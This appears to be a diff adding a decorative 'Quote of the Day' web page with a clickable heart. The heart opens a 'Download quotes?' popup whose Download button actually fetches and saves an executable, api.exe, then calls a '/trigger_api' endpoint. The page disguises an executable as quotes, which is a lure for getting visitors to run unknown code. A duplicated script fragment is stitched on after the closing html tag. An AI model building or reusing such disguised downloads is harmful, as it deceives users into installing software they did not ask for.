@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interactive Heart</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f7f7e7;
+            position: relative;
+            margin: 0;
+        }
+
+        img {
+            width: 100%;
+            height: 100%;
+            border-radius: 10px;
+            box-shadow: 5px 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .heart-container {
+            position: absolute;
+            top: calc(50% - 80px); /* Move 250px higher */
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 150px;
+            height: 150px;
+            cursor: pointer;
+        }
+
+        svg {
+            width: 100%;
+            height: 100%;
+            transition: fill 0.3s ease-in-out;
+        }
+
+        /* Popup styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background-color: white;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .popup button {
+            margin: 10px;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <img src="../static/ima.png" alt="Quote of the Day" />
+    <div class="heart-container" id="heart-container">
+        <svg id="heart" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"
+                fill="none" stroke="rgb(240, 163, 199)" stroke-width="1.2"/>
+        </svg>
+    </div>
+
+    <!-- Popup for asking download confirmation -->
+    <div class="popup" id="popup">
+        <p>Download quotes?</p>
+        <button id="downloadBtn">Download</button>
+        <button id="cancelBtn">Cancel</button>
+    </div>
+
+    <script>
+        document.getElementById("heart").addEventListener("click", function() {
+            let heart = this.querySelector("path");
+
+            // Toggle the heart fill color
+            if (heart.getAttribute("fill") === "none") {
+                heart.setAttribute("fill", "rgb(241, 194, 219)");  // RGB Fill Color
+            } else {
+                heart.setAttribute("fill", "none");
+            }
+
+            // Show the popup
+            document.getElementById("popup").style.display = 'block';
+        });
+
+        // Handle download action
+        document.getElementById("downloadBtn").addEventListener("click", function() {
+            // Hide the popup
+            document.getElementById("popup").style.display = 'none';
+
+            // Create a download link for api.exe
+            var link = document.createElement('a');
+            link.href = "/static/api.exe";  // Correct link to the static file
+            link.download = "api.exe";  // Download the file as api.exe
+            link.click();  // Simulate a click to trigger the download
+
+            // Optionally, trigger the API call after download (if needed)
+            fetch('/trigger_api', { method: 'POST' })
+                .then(response => response.json())
+                .then(data => console.log(data))  // Log the response from the API
+                .catch(error => console.error("Error:", error));
+        });
+
+        // Handle cancel action
+        document.getElementById("cancelBtn").addEventListener("click", function() {
+            // Hide the popup without triggering the backend
+            document.getElementById("popup").style.display = 'none';
+        });
+    </script>
+</body>
+</html>
+
+// New part
+
+<!-- Popup for asking download confirmation -->
+<div class="popup" id="popup">
+    <p>Download quotes?</p>
+    <button id="downloadBtn">Download</button>
+    <button id="cancelBtn">Cancel</button>
+</div>
+
+<script>
+    document.getElementById("downloadBtn").addEventListener("click", function() {
+        // Hide the popup
+        document.getElementById("popup").style.display = 'none';
+
+        // Create a download link for api.exe
+        var link = document.createElement('a');
+        link.href = "/static/api.exe";  // Correct link to the static file
+        link.download = "api.exe";  // Download the file as api.exe
+        link.click();  // Simulate a click to trigger the download
+    });
+</script>
